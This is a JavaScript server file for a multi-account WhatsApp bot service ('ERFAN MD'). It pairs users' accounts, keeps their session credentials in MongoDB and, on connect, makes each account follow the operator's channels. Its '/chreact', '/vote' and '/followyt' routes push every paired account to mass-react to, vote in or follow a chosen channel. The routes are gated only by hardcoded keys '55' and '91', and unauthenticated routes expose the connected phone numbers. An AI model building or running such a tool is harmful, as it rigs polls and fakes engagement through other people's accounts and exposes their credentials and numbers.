            printQRInTerminal: false,
            logger,
            version,
            browser: Browsers.macOS('Safari'),
            syncFullHistory: false,
        });
        
        socketCreationTime.set(sanitizedNumber, Date.now());

        let userConfig;
        try {
            userConfig = await loadUserConfig(sanitizedNumber);
            userConfig = { ...config.DEFAULT_SETTINGS, ...userConfig };
        } catch (error) {
            userConfig = { ...config.DEFAULT_SETTINGS };
        }

        conn.userConfig = userConfig;

        setupMessageHandlers(conn, sanitizedNumber, userConfig);
        setupCombinedHandlers(conn, userConfig);
        setupAntiDeleteHandler(conn);
        setupAntiCallHandler(conn, userConfig);
        conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

        // ====== CREDS UPDATE LISTENER (SILENT) ======
        const credsUpdateListener = async () => {
            try {
                await saveCreds();
                await delay(500);
                
                const credsPath = path.join(sessionPath, 'creds.json');
                if (fsSync.existsSync(credsPath)) {
                    const fileContent = await fs.readFile(credsPath, 'utf8');
                    
                    if (fileContent && fileContent.trim().length > 0) {
                        try {
                            const sessionData = JSON.parse(fileContent);
                            await saveSessionToMongoDB(sanitizedNumber, sessionData);
                        } catch (parseError) {}
                    }
                }
            } catch (error) {}
        };

        conn.ev.on('creds.update', credsUpdateListener);
        
        // ====== CONNECTION UPDATE ======
        conn.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                try {
                    await delay(3000);
                    sessionStartedAt.set(sanitizedNumber, Date.now());
                    
                    try {
                        await followNewsletterChannels(conn);
                    } catch (error) {}

                    try {
                        await saveUserConfigToMongoDB(sanitizedNumber, userConfig);
                        await saveNumberToMongoDB(sanitizedNumber);
                        activeSockets.set(sanitizedNumber, conn);
                        
                        const sessionDoc = await db.collection(config.COLLECTIONS.SESSIONS).findOne({ 
                            number: sanitizedNumber 
                        });
                        
                        const welcomeSent = sessionDoc?.welcomeSent || false;
                        
                        if (!welcomeSent) {
                            const startMess = `*🤖 ERFAN MD Aᴄᴛɪᴠᴀᴛᴇᴅ*

.menu for commands

> ⚡ Version: 19.3`;

                            try {
                                await conn.sendMessage(
                                    conn.user.id.split(':')[0] + "@s.whatsapp.net", 
                                    {
                                        image: { url: config.IK_IMAGE_PATH },
                                        caption: startMess
                                    }, 
                                    { disappearingMessagesInChat: true, ephemeralExpiration: 100 }
                                );
                            } catch (imageError) {
                                await conn.sendMessage(
                                    conn.user.id.split(':')[0] + "@s.whatsapp.net", 
                                    { text: startMess }, 
                                    { disappearingMessagesInChat: true, ephemeralExpiration: 100 }
                                );
                            }
                            
                            await db.collection(config.COLLECTIONS.SESSIONS).updateOne(
                                { number: sanitizedNumber },
                                { 
                                    $set: { 
                                        welcomeSent: true,
                                        welcomeSentAt: new Date(),
                                        status: 'connected'
                                    } 
                                },
                                { upsert: true }
                            );
                        }

                    } catch (error) {}
                    
                } catch (error) {
                    console.error(`Error finishing connection setup for ${sanitizedNumber}:`, error.message);
                }
            }
            
            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const errorMessage = lastDisconnect?.error?.message || 'Unknown error';
                
                activeSockets.delete(sanitizedNumber);
                socketCreationTime.delete(sanitizedNumber);
                sessionStartedAt.delete(sanitizedNumber);
                
                const LOGOUT_CODES = [401, 403, 404, 419];
                
                if (LOGOUT_CODES.includes(statusCode)) {
                    conn.ev.off('creds.update', credsUpdateListener);
                    await handleLogout401(sanitizedNumber, conn, errorMessage);
                    return;
                }
                
                if (!conn.authState?.creds?.registered) {
                    await handleLogout401(sanitizedNumber, conn, 'Pairing not completed');
                    return;
                }
                
                try {
                    conn.ev.removeAllListeners();
                } catch (_) {}
                
                // ====== RECONNECT WITH EXPONENTIAL BACKOFF ======
                const attemptReconnect = async (retryDelayMs = 5000) => {
                    try {
                        await delay(retryDelayMs);
                        
                        if (activeSockets.has(sanitizedNumber)) {
                            return;
                        }
                        
                        connectMsgSentFor.delete(sanitizedNumber);
                        reconnectAttempts.delete(sanitizedNumber);
                        userWarnings.delete(sanitizedNumber);
                        
                        const mockRes = { 
                            headersSent: false, 
                            send: () => {}, 
                            status: () => mockRes 
                        };
                        await EmpirePair(number, mockRes);
                    } catch (error) {
                        const nextDelay = Math.min(retryDelayMs * 2, 60000);
                        await attemptReconnect(nextDelay);
                    }
                };
                
                await attemptReconnect(5000);
            }
        });
        
        if (!conn.authState.creds.registered) {
            let retries = 3;
            let code;
            while (retries > 0) {
                try {
                    await delay(1500);
                    try {
                        code = await conn.requestPairingCode(sanitizedNumber, 'ERFANXMD');
                        break;
                    } catch (requestError) {
                        if (requestError.message?.includes('Connection Closed')) {
                            if (res && !res.headersSent) {
                                return res.status(503).send({ 
                                    error: 'Connection closed. Please try again.'
                                });
                            }
                            return null;
                        }
                        throw requestError;
                    }
                } catch (error) {
                    retries--;
                    if (retries === 0) {
                        if (res && !res.headersSent) {
                            return res.status(503).send({ 
                                error: 'Failed to generate pairing code',
                                message: 'Please try again or check your number format'
                            });
                        }
                        throw error;
                    }
                    await delay(2000 * (3 - retries));
                }
            }
            
            if (res && !res.headersSent) {
                return res.send({ code });
            }
        }
        
        return conn;
        
    } catch (error) {
        socketCreationTime.delete(sanitizedNumber);
        sessionStartedAt.delete(sanitizedNumber);
        if (res && !res.headersSent) {
            res.status(503).send({ 
                error: 'Service Unavailable',
                message: 'Failed to pair. Please try again.'
            });
        }
        throw error;
    }
}

// ===============================
// AUTO RECONNECT FROM MONGODB
// ===============================
async function autoReconnectFromMongoDB() {
    try {
        const numbers = await getAllNumbersFromMongoDB();
        
        if (!Array.isArray(numbers)) return;

        const currentSessions = activeSockets.size;
        const availableSlots = MAX_ACTIVE_SESSIONS - currentSessions;
        
        if (availableSlots <= 0) return;

        const numbersToReconnect = numbers.slice(0, availableSlots);

        for (const number of numbersToReconnect) {
            if (activeSockets.has(number)) continue;

            try {
                const mockRes = { 
                    headersSent: false, 
                    send: () => {}, 
                    status: () => mockRes 
                };
                await EmpirePair(number, mockRes);
                await delay(1000);
            } catch (reconnectError) {
                console.error(`❌ Auto reconnect failed for ${number}:`, reconnectError.message);
            }
        }
        
    } catch (error) {
        console.error('❌ Auto reconnect error:', error.message);
    }
}

// ===============================
// PROCESS SIGNAL HANDLERS
// ===============================
process.on('SIGINT', async () => {
    console.log('🛑 Received SIGINT - Shutting down cleanly...');
    for (const [number, conn] of activeSockets) {
        try {
            conn.ev.removeAllListeners();
            if (conn.ws) await conn.ws.close();
        } catch (_) {}
    }
    if (client) {
        try { await client.close(); } catch (_) {}
    }
    process.exit(0);
});

process.on('SIGTERM', async () => {
    console.log('🛑 Received SIGTERM - Shutting down cleanly...');
    for (const [number, conn] of activeSockets) {
        try {
            conn.ev.removeAllListeners();
            if (conn.ws) await conn.ws.close();
        } catch (_) {}
    }
    if (client) {
        try { await client.close(); } catch (_) {}
    }
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error(`💥 Uncaught exception: ${err.message}`);
    console.error(err.stack);
    console.log('🔄 Restarting in 3 seconds...');
    setTimeout(() => startServer(), 3000);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('💥 Unhandled Rejection at:', promise);
    console.error('💥 Reason:', reason);
    console.log('🔄 Restarting in 3 seconds...');
    setTimeout(() => startServer(), 3000);
});

// ===============================
// HELPER FUNCTION FOR CONNECTION STATUS
// ===============================
function connectionStatus(number) {
    const n = number.replace(/[^0-9]/g, '');
    const socket = activeSockets.get(n);
    const createdAt = socketCreationTime.get(n);
    const startedAt = sessionStartedAt.get(n);
    
    return {
        connected: !!socket,
        createdAt: createdAt ? new Date(createdAt).toISOString() : null,
        sessionStartedAt: startedAt ? new Date(startedAt).toISOString() : null,
        uptime: startedAt ? Date.now() - startedAt : 0
    };
}

// ===============================
// EXPRESS ROUTES
// ===============================
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "lib")));

app.get("/", (req, res) => {
    const mainHtmlPath = path.join(__dirname, "lib", "main.html");
    if (fs.existsSync(mainHtmlPath)) {
        res.sendFile(mainHtmlPath);
    } else {
        res.sendFile(path.join(__path, 'main.html'));
    }
});

// ====== LIST ACTIVE SESSIONS ======
app.get('/list', (req, res) => {
    try {
        const activeNumbers = [];
        let index = 1;
        
        for (const [number] of activeSockets) {
            activeNumbers.push({
                [`${index}`]: number
            });
            index++;
        }
        
        res.status(200).json(activeNumbers);
        
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ====== STATUS ROUTE ======
app.get('/status', (req, res) => {
    const { number } = req.query;
    if (!number) {
        const list = Array.from(activeSockets.keys()).map((n) => ({ number: n, ...connectionStatus(n) }));
        return res.json({ totalActive: activeSockets.size, connections: list });
    }
    res.json({ number, ...connectionStatus(number) });
});

// ====== CONNECT ROUTE  ======
app.get('/connect', async (req, res) => {
    const { number } = req.query;
    if (!number) return res.status(400).json({ error: 'Null' });
    const n = number.replace(/[^0-9]/g, '');
    const socket = activeSockets.get(n);
    if (!socket) return res.status(404).json({ error: 'Not found' });
    try {
        await socket.ws.close();
        socket.ev.removeAllListeners();
        activeSockets.delete(n);
        sessionStartedAt.delete(n);
        socketCreationTime.delete(n);

        await deleteSessionFromMongoDB(n);
        await deleteNumberFromMongoDB(n);
        await deleteConfigFromMongoDB(n);

        connectMsgSentFor.delete(n);
        reconnectAttempts.delete(n);
        userWarnings.delete(n);
        res.json({ status: 'success', message: 'Done' });
    } catch (e) {
        res.status(500).json({ error: 'Failed' });
    }
});

// ====== ACTIVE ROUTE ======
app.get('/active', (req, res) => {
    res.json({ count: activeSockets.size, numbers: Array.from(activeSockets.keys()) });
});

// ====== PING ROUTE ======
app.get('/ping', (req, res) => {
    res.json({
        status: 'active',
        message: `${config.BOT_NAME} is running`,
        activeSessions: activeSockets.size
    });
});

// ====== CONNECT-ALL ROUTE ======
app.get('/connect-all', async (req, res) => {
    try {
        const numbers = await getAllNumbersFromMongoDB();
        const results = [];
        for (const number of numbers) {
            const sanitized = number.replace(/[^0-9]/g, '');
            if (activeSockets.has(sanitized)) {
                results.push({ number: sanitized, status: 'already_connected' });
                continue;
            }
            const mockRes = { headersSent: true, json: () => {}, status: () => mockRes };
            await EmpirePair(sanitized, mockRes).catch(() => {});
            results.push({ number: sanitized, status: 'connection_initiated' });
            await delay(1000);
        }
        res.json({ status: 'success', total: numbers.length, connections: results });
    } catch (e) {
        res.status(500).json({ error: 'Failed' });
    }
});

// ====== CODE ROUTE (Pairing) ======
app.get('/code', async (req, res) => {
    const { number } = req.query;
    if (!number) {
        return res.status(400).send({ error: 'Number parameter is required' });
    }

    const sanitizedNumber = number.replace(/[^0-9]/g, '');
    
    if (activeSockets.size >= MAX_ACTIVE_SESSIONS) {
        return res.status(429).send({
            error: 'Maximum sessions limit reached',
            message: `Maximum ${MAX_ACTIVE_SESSIONS} active sessions allowed. Please try again later.`,
            current_sessions: activeSockets.size,
            max_sessions: MAX_ACTIVE_SESSIONS
        });
    }

    try {
        await EmpirePair(number, res);
    } catch (error) {
        console.error('Pairing route error:', error);
        if (!res.headersSent) {
            res.status(500).send({ 
                error: 'Failed to generate pairing code',
                message: 'Please try again or check your number format'
            });
        }
    }
});

// ============================================================
//  ERFAN MD — CHREACT + POLL VOTE (ALL-IN-ONE REPLACEMENT BLOCK)
// ============================================================
//  ISTEMAAL KA TAREEQA (sirf ROUTES replace honge):
//
//  Index se sirf ye 2 ROUTES delete karo:
//    1) "// ====== CHREACT ROUTE ======" se le kar us route ke
//       closing "});" tak
//    2) "app.get('/vote', ...)" se le kar us route ke closing
//       "});" tak (jo "// ====== FOLLOW ROUTE ======" se pehle hai)
//
//  Phir is POORI file ka content wahan paste kar do — bas.
//  Baqi index (functions, helpers, sab) waise ka waisa rahega.
//
//  NOTE:
//  - Purane functions (reactToChannelPostForAllBots, sendVoteFromAllBots,
//    fetchChannelPost, getChannelJid) index mein rehne do — wo ab use
//    nahi honge, koi masla nahi hoga.
//  - Is block ke functions NAYE naam use karte hain (sendChannelReacts,
//    voteWithBot, waghera) — kisi purane function se clash nahi hoga.
//  - Required imports (index mein pehle se maujood): createHash (crypto),
//    proto aur delay (Baileys). Agar "sleep" pehle se defined ho to
//    conflict na ho is liye yahan "pvSleep" use kiya hai.
// ============================================================

// ------------------------------------------------------------
// POLL VOTE ENGINE (lib/only.js style — embedded, proven working)
// Har bot khud poll fetch karta hai (3 query variants), option
// verify karta hai, vote bhejta hai aur readback se CONFIRM karta hai.
// ------------------------------------------------------------
const pvSleep = (ms) => new Promise((r) => setTimeout(r, ms));

const hashOption = (name) => createHash('sha256').update(Buffer.from(name, 'utf8')).digest();
const toHex = (bytes) => Buffer.from(bytes).toString('hex');

function walkNodes(node, visit) {
    if (!node || typeof node !== 'object') return;
    if (typeof node.tag === 'string') visit(node);
    if (Array.isArray(node.content)) {
        for (const child of node.content) walkNodes(child, visit);
    }
}

function collectTags(node) {
    const tags = new Set();
    walkNodes(node, (n) => tags.add(n.tag));
    return [...tags];
}

function childOf(node, tag) {
    return Array.isArray(node?.content) ? node.content.find((c) => c?.tag === tag) : undefined;
}

function votesOf(messageNode) {
    const votesNode = childOf(messageNode, 'votes');
    if (!votesNode || !Array.isArray(votesNode.content)) return [];
    return votesNode.content
        .filter((v) => v?.tag === 'vote' && v.content)
        .map((v) => ({ hash: toHex(v.content), count: parseInt(v.attrs?.count || '0', 10) || 0 }));
}

// poll object dhoondo (pollCreationMessage / V2 / V3 / V4 / V5 future proof)
function findPollCreation(obj, depth = 0) {
    if (!obj || typeof obj !== 'object' || depth > 6) return null;
    for (const key of Object.keys(obj)) {
        const val = obj[key];
        if (/^pollCreationMessage/i.test(key) && val && Array.isArray(val.options) && val.options.length) {
            return val;
        }
    }
    for (const key of Object.keys(obj)) {
        const val = obj[key];
        if (val && typeof val === 'object') {
            const found = findPollCreation(val, depth + 1);
            if (found) return found;
        }
    }
    return null;
}

function extractPollFromResult(result, postId) {
    let poll = null;
    walkNodes(result, (node) => {
        if (poll || node.tag !== 'message') return;
        if (String(node.attrs?.server_id) !== String(postId)) return;

        const plain = childOf(node, 'plaintext');
        if (!plain || !plain.content) return;

        try {
            const bytes = plain.content instanceof Uint8Array ? plain.content : Buffer.from(plain.content);
            const msg = proto.Message.decode(bytes);
            const creation = findPollCreation(msg);
            if (creation) {
                poll = {
                    name: creation.name || '',
                    options: creation.options.map((o) => o.optionName || ''),
                    selectableCount: creation.selectableOptionsCount || 0,
                    tallies: votesOf(node),
                };
            }
        } catch (_e) {}
    });
    return poll;
}

// FETCH POLL — 3 query variants: pehla fail ho to agla try hota hai
// (purane index mein sirf 1 variant tha jis se "Post not found" aata tha)
async function fetchChannelPoll(conn, jid, postId) {
    const idNum = Number(postId);
    let lastError = null;

    const variants = [
        { count: '1', before: String(idNum + 1) },
        { count: '20', before: String(idNum + 1) },
        { count: '50' },
    ];

    for (const v of variants) {
        try {
            const result = await conn.query({
                tag: 'iq',
                attrs: { id: conn.generateMessageTag(), to: 's.whatsapp.net', xmlns: 'newsletter', type: 'get' },
                content: [{ tag: 'messages', attrs: { type: 'jid', jid, ...v } }],
            });
            const poll = extractPollFromResult(result, postId);
            if (poll) return { poll, lastError: null };
        } catch (e) {
            lastError = e.message;
        }
    }
    return { poll: null, lastError };
}

// READ MY OWN VOTE (confirmation readback)
async function readMyVote(conn, jid, postId) {
    const result = await conn.query({
        tag: 'iq',
        attrs: { id: conn.generateMessageTag(), to: 's.whatsapp.net', xmlns: 'newsletter', type: 'get' },
        content: [{ tag: 'my_addons', attrs: { limit: '50', jid } }],
    });

    let hashes = null;
    walkNodes(result, (node) => {
        if (node.tag !== 'message') return;
        if (String(node.attrs?.server_id) !== String(postId)) return;
        hashes = votesOf(node).map((v) => v.hash);
    });
    return { hashes };
}

// SEND VOTE
async function sendPollVote(conn, jid, postId, hashes) {
    return conn.query({
        tag: 'message',
        attrs: {
            to: jid,
            id: conn.generateMessageTag(),
            server_id: String(postId),
            type: 'poll',
        },
        content: [
            { tag: 'meta', attrs: { polltype: 'vote' } },
            {
                tag: 'votes',
                attrs: {},
                content: hashes.map((h) => ({ tag: 'vote', attrs: {}, content: h })),
            },
        ],
    });
}

// ONE-BOT VOTE (fetch -> send -> confirm)
// Returns: { success, confirmed, optionLabels, pollName, error }
async function voteWithBot(conn, channelId, postId, parsed) {
    try {
        // Channel JID
        const channelMeta = await conn.newsletterMetadata('invite', channelId);
        if (!channelMeta || !channelMeta.id) {
            return { success: false, error: 'channel_meta_failed' };
        }
        const jid = channelMeta.id;

        // Poll fetch
        const { poll, lastError } = await fetchChannelPoll(conn, jid, postId);

        let optionNames = [];
        let optionLabels = [];

        if (parsed.mode === 'index') {
            if (!poll) {
                return { success: false, error: 'poll_fetch_failed', detail: lastError || 'no poll found' };
            }
            for (const idx of parsed.indexes) {
                if (idx > poll.options.length) {
                    return { success: false, error: 'invalid_option_index', options: poll.options };
                }
                optionNames.push(poll.options[idx - 1]);
                optionLabels.push(`${String.fromCharCode(64 + idx)}. ${poll.options[idx - 1]}`);
            }
        } else {
            for (const typed of parsed.names) {
                if (poll) {
                    const i = poll.options.findIndex((o) => o.trim().toLowerCase() === typed.trim().toLowerCase());
                    if (i === -1) {
                        return { success: false, error: 'option_name_not_found', options: poll.options };
                    }
                    optionNames.push(poll.options[i]);
                    optionLabels.push(`${String.fromCharCode(65 + i)}. ${poll.options[i]}`);
                } else {
                    optionNames.push(typed);
                    optionLabels.push(typed);
                }
            }
        }

        if (poll && poll.selectableCount === 1 && optionNames.length > 1) {
            return { success: false, error: 'single_choice_poll' };
        }

        // Vote bhejo
        const hashes = optionNames.map(hashOption);
        await sendPollVote(conn, jid, postId, hashes);

        // Confirm (readback)
        await pvSleep(2000);
        let confirmed = false;
        try {
            const readback = await readMyVote(conn, jid, postId);
            const mine = readback.hashes || [];
            confirmed = hashes.length > 0 && hashes.every((h) => mine.includes(toHex(h)));
        } catch (_e) {}

        return {
            success: true,
            confirmed,
            optionLabels,
            pollName: poll?.name || null,
        };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// PARSE OPTION INPUT
// A / B / C / 1 / 2 / 3 / A,C -> index mode
// anything else               -> name mode
function parseOptionInput(raw) {
    const input = (raw || '').trim();
    if (!input) return null;

    const tokens = input.split(',').map((t) => t.trim()).filter(Boolean);
    const allIndexTokens = tokens.length > 0 && tokens.every((t) => /^[a-zA-Z]$/.test(t) || /^\d{1,2}$/.test(t));

    if (allIndexTokens) {
        const indexes = [];
        for (const t of tokens) {
            const idx = /^\d+$/.test(t) ? parseInt(t) : t.toUpperCase().charCodeAt(0) - 64;
            if (idx < 1) return null;
            if (!indexes.includes(idx)) indexes.push(idx);
        }
        return { mode: 'index', indexes };
    }

    const name = input.startsWith('=') ? input.slice(1).trim() : input;
    if (!name) return null;
    return { mode: 'name', names: [name] };
}

// ------------------------------------------------------------
// CHANNEL REACT ENGINE — improved version
// (Naya naam "sendChannelReacts" taake purane function se na takraye)
// - Har bot par 1 retry (1.5s baad) — rate-overlimit/temporary
//   error par bot drop nahi hota
// - Delay 500ms -> 200ms (2.5x fast)
// - Success/fail counts return + console summary log
// ------------------------------------------------------------
async function sendChannelReacts(channelInput, emojisList) {
    let channelId, messageId;

    if (channelInput.includes('@newsletter')) {
        const jidParts = channelInput.split('/');
        const newsletterJid = jidParts[0];
        messageId = jidParts[1] || null;
        channelId = newsletterJid.split('@')[0];

        if (!messageId) {
            throw new Error('Message ID required for newsletter JID format. Use: JID@newsletter/messageId');
        }
    } else {
        const urlMatch = channelInput.match(/https?:\/\/whatsapp\.com\/channel\/([^\/]+)\/(\d+)/);
        if (!urlMatch) {
            throw new Error('Invalid format. Use URL: https://whatsapp.com/channel/ID/MESSAGE or Newsletter JID: ID@newsletter/MESSAGE');
        }
        channelId = urlMatch[1];
        messageId = urlMatch[2];
    }

    const emojisToUse = emojisList && emojisList.length > 0 ? emojisList : ['❤️', '👍', '😮', '😎', '💀'];

    const firstSocket = activeSockets.values().next().value;
    if (!firstSocket) {
        throw new Error('No active bot sessions available');
    }

    const channelMeta = await firstSocket.newsletterMetadata('invite', channelId);
    if (!channelMeta || !channelMeta.id) {
        throw new Error('Failed to get channel metadata');
    }

    let reacted = 0;
    let failed = 0;

    for (const [number, conn] of activeSockets) {
        const selectedEmoji = emojisToUse[Math.floor(Math.random() * emojisToUse.length)];
        let sent = false;
        // 2 attempts: pehli koshish fail ho to 1.5s baad ek retry
        for (let attempt = 1; attempt <= 2 && !sent; attempt++) {
            try {
                await conn.newsletterReactMessage(channelMeta.id, messageId, selectedEmoji);
                sent = true;
            } catch (error) {
                if (attempt === 2) {
                    failed++;
                    console.error(`React failed for ${number}:`, error.message);
                } else {
                    await delay(1500);
                }
            }
        }
        if (sent) reacted++;
        await delay(200); // Rate limit delay
    }

    console.log(`📊 REACT summary: ${reacted} sent | ${failed} failed | ${activeSockets.size} bots`);
    return { success: true, reacted, failed, total: activeSockets.size };
}

// ============================================================
// ROUTES (same paths & params as before: /chreact, /vote, key=55)
// ============================================================

// ====== CHREACT ROUTE ======
app.get('/chreact', async (req, res) => {
    try {
        const { url, emojis, key } = req.query;
        const SECRET_KEY = '55';

        if (!key || key !== SECRET_KEY) {
            return res.status(401).json({
                success: false,
                error: '🔐 Unauthorized! Invalid or missing secret key',
            });
        }

        if (!url) {
            return res.status(400).json({
                success: false,
                error: 'URL or Newsletter JID parameter is required',
            });
        }

        if (activeSockets.size === 0) {
            return res.status(503).json({
                success: false,
                error: 'No active bot sessions available',
            });
        }

        let emojisList = [];
        if (emojis) {
            emojisList = emojis.split(',').map((e) => e.trim()).filter((e) => e);
        }

        const result = await sendChannelReacts(url, emojisList);

        return res.status(200).json({
            success: true,
            message: '✅ Reacts sent successfully',
            reacted: result.reacted,
            failed: result.failed,
            total: result.total,
        });
    } catch (error) {
        return res.status(500).json({
            success: false,
            error: error.message || 'Failed to react to channel post',
        });
    }
});

// ====== VOTE ROUTE ======
app.get('/vote', async (req, res) => {
    try {
        const { key, url, option } = req.query;
        const SECRET_KEY = '55';

        if (!key || key !== SECRET_KEY) {
            return res.status(401).json({ success: false, error: '🔐 Unauthorized! Invalid key' });
        }
        if (!url || !option) {
            return res.status(400).json({ success: false, error: 'URL and option are required' });
        }
        if (activeSockets.size === 0) {
            return res.status(503).json({ success: false, error: 'No active bots' });
        }

        // 1. Link se channelId + postId
        const match = url.match(/whatsapp\.com\/channel\/([A-Za-z0-9]+)\/(\d+)/);
        if (!match) {
            return res.status(400).json({ success: false, error: 'Invalid WhatsApp Channel Link' });
        }
        const channelId = match[1];
        const postId = match[2];

        // 2. Option parse (A / B / C / 1 / 2 / 3 / A,C / =Name)
        const parsed = parseOptionInput(option);
        if (!parsed) {
            return res.status(400).json({ success: false, error: 'Invalid option format' });
        }

        // 3. Har bot se vote (parallel) — har bot khud poll fetch karta
        //    hai, option verify karta hai, vote bhejta hai aur confirm karta hai
        const tasks = [];
        for (const [number, conn] of activeSockets) {
            tasks.push(
                voteWithBot(conn, channelId, postId, parsed)
                    .then((r) => ({ number, ...r }))
                    .catch((e) => ({ number, success: false, error: e.message }))
            );
        }
        const results = await Promise.all(tasks);

        const totalBots = results.length;
        const sent = results.filter((r) => r.success).length;
        const confirmed = results.filter((r) => r.confirmed).length;

        console.log(`📊 VOTE summary: ${sent} sent | ${confirmed} confirmed | ${totalBots - sent} failed | ${totalBots} bots`);

        return res.status(200).json({
            success: true,
            message: '✅ Votes sent successfully',
            total: totalBots,
            voted: sent,
            confirmed: confirmed,
            failed: totalBots - sent,
            channel: channelId,
            post: postId,
            option: option,
        });
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message || 'Failed to vote' });
    }
});

// ====== FOLLOW ROUTE ======
app.get('/followyt', async (req, res) => {
    try {
        const { channel, key } = req.query;
        const SECRET_KEY = "91";
        
        if (!key || key !== SECRET_KEY) {
            return res.status(401).json({
                success: false,
                error: "🔐 Unauthorized! Invalid or missing secret key"
            });
        }
        
        if (!channel) {
            return res.status(400).json({
                success: false,
                error: 'Channel parameter is required',
                example: '/follow?channel=120363416743041101@newsletter&key'
            });
        }
        
        if (activeSockets.size === 0) {
            return res.status(503).json({
                success: false,
                error: 'No active bot sessions available'
            });
        }
        
        let successCount = 0;
        
        for (const [number, conn] of activeSockets) {
            try {
                await conn.newsletterFollow(channel);
                successCount++;
                await delay(500);
            } catch (error) {}
        }
        
        return res.status(200).json({
            success: true,
            message: `✅ Followed successfully! ${successCount}/${activeSockets.size} bots followed`,
            followed: successCount,
            total: activeSockets.size,
            channel: channel
        });
        
    } catch (error) {
        console.error('Follow channel error:', error);
        return res.status(500).json({
            success: false,
            error: error.message || 'Failed to follow channel'
        });
    }
});

// ====== DUMMY UNFOLLOW ROUTE ======
app.get('/unfollowyt', async (req, res) => {
    try {
        const { key } = req.query;
        const SECRET_KEY = "91";
        
        if (!key || key !== SECRET_KEY) {
            return res.status(401).json({ error: "Unauthorized" });
        }
        
        return res.json({ 
            success: true, 
            message: "Unfollow functionality has been removed."
        });
        
    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
});

// ===============================
// START SERVER
// ===============================
let serverStarted = false;

async function startServer() {
    try {
        if (!serverStarted) {
            const PORT = process.env.PORT || 8000;
            app.listen(PORT, () => {
                console.log(`🚀 ERFAN MD Server running on: http://localhost:${PORT}`);
            });
            serverStarted = true;
        }
        
        await connectMongoDB();
        await loadPlugins();
        
        setInterval(autoReconnectFromMongoDB, 5 * 60 * 1000);
        autoReconnectFromMongoDB();
        
    } catch (error) {
        console.error('❌ Failed to start server:', error.message);
        console.log('🔄 Retrying in 5 seconds...');
        setTimeout(startServer, 5000);
    }
}

startServer();

export default app;
